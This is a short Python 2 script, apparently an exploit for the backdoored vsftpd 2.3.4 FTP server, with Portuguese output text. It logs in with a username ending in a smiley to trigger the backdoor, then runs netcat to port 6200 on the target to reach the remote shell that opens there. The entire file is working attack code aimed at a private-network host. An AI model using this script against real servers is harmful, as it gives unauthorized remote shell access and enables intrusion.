#!/usr/bin/python

import socket,os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.1.5",21))
r = s.recv(1024)
s.send("USER leandro:)\r\n")
s.send("PASS qualquercoisa\r\n")
print "Explorando servico..."
os.system("nc -vn 172.16.1.5 6200")
